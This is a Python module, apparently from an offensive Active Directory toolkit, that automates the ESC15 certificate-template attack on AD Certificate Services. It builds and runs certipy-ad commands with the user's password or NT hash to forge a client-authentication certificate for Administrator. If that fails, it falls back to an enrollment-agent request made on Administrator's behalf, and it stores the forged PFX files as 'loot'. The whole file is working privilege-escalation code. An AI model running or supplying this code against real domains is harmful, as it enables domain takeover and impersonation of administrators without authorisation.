import os
from core.helpers import run_command, save_loot, load_json_loot
from core.colors import blue, green, red, yellow

def abuse_esc15(session):
    print(blue("[>] ESC15: Abusing misconfigured certificate templates that allow specifying Application Policies (e.g., ClientAuth)."))
    print(yellow("[*] This attack forges a client-auth certificate for Administrator via misused templates."))

    ca_name = session.adcs_metadata['cas'][0]['name']
    dc_ip = session.dc_ip
    username = session.username
    domain = session.domain

    # === Support both password and NT hash
    if session.hash:
        auth = f"-u {username}@{domain} -hashes {session.hash}"
    elif session.password:
        auth = f"-u {username}@{domain} -p '{session.password}'"
    else:
        print(red("[-] No credentials provided (password or hash)."))
        return

    templates = session.adcs_metadata['cas'][0].get("templates") or load_json_loot(session, template_fallback=True)
    if not templates:
        print(red("[-] No templates available. Run 'adcs enum' first."))
        return

    esc15_templates = [tpl for tpl in templates if "ESC15" in tpl.get("vulns", [])]

    if not esc15_templates:
        print(red("[-] No ESC15 vulnerable templates detected. Ensure ADCS enum was run properly."))
        return

    print(blue("[*] ESC15 Vulnerable Templates:\n"))
    for i, tpl in enumerate(esc15_templates, 1):
        print(f"  [{i}] {tpl['name']}")

    try:
        choice = int(input("\nSelect template index: ").strip())
        template = esc15_templates[choice - 1]['name']
    except (ValueError, IndexError):
        print(red("[-] Invalid selection."))
        return

    upn = input(f"[?] Enter target UPN (e.g., Administrator@{domain}): ").strip() or f"Administrator@{domain}"
    output_file = "administrator_esc15_method1.pfx"

    print(blue("[*] Method 1: Request certificate with UPN override and Client Authentication policy"))
    method1_cmd = (
        f"certipy-ad req -dc-ip {dc_ip} -ca '{ca_name}' -target-ip {dc_ip} "
        f"{auth} -template {template} "
        f"-upn {upn} -application-policies 'Client Authentication' -out {output_file}"
    )

    out, err = run_command(method1_cmd)
    print(out.strip() or err.strip())

    if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
        with open(output_file, "rb") as f:
            save_loot(output_file, f.read(), binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"))
        print(yellow(f"[*] Command executed: {method1_cmd}"))
        return

    print(red("[-] Method 1 failed or did not produce a valid certificate. Falling back to Method 2..."))

    intermed_pfx = "cert_admin_esc15_method2.pfx"
    method2_stage1 = (
        f"certipy-ad req {auth} -application-policies \"1.3.6.1.4.1.311.20.2.1\" "
        f"-ca {ca_name} -template {template} -dc-ip {dc_ip} -out {intermed_pfx}"
    )

    print(blue("[*] Requesting intermediate certificate with custom OID..."))
    out, err = run_command(method2_stage1)
    print(out.strip() or err.strip())

    if not os.path.exists(intermed_pfx):
        print(red("[-] Intermediate certificate (method 2) not generated. Aborting."))
        return

    method2_stage2 = (
        f"certipy-ad req {auth} -on-behalf-of {domain}\\Administrator "
        f"-template User -ca {ca_name} -pfx {intermed_pfx} -dc-ip {dc_ip} -out administrator_esc15_method2.pfx"
    )

    print(blue("[*] Requesting certificate on behalf of Administrator..."))
    out, err = run_command(method2_stage2)
    print(out.strip() or err.strip())

    if os.path.exists("administrator_esc15_method2.pfx"):
        with open("administrator_esc15_method2.pfx", "rb") as f:
            save_loot("administrator_esc15_method2.pfx", f.read(), binary=True)
        print(green("[+] Forged certificate saved to loot/administrator_esc15_method2.pfx"))
    else:
        print(red("[-] Method 2 failed. Certificate not saved."))
        print(yellow("[!] If the PFX file was not created or saved, retry the attack. It could be a connection issue."))

    print(yellow(f"[*] Method 2 final command executed: {method2_stage2}"))
